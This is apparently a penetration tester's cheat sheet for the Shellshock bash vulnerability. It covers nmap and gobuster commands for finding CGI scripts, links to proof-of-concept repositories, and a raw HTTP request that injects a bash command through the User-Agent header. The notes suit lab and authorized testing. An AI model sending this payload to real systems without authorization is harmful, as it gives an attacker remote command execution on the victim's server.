# Shellshock
------

Checking using nmap:
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```

Manual checks:
https://github.com/mubix/shellshocker-pocs
https://github.com/opsxcq/exploit-CVE-2014-6271

Check if /cgi-bin/ is accessible, even if the page returns forbidden error and we don't have the permission to access.

Run gobuster:
```bash
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x sh,php,pl,html,txt

/user.sh
```

Once found, use payloads in HTTP Requests:
```bash
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-agent: () { :; }; echo; echo; /bin/bash -c 'whoami'
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

Checking for shellshock using shellshocker:
https://github.com/AlmCo/Shellshocker
```bash
python3 shellshocker.py http://10.10.10.56/cgi-bin/user.sh
```
Not as reliable.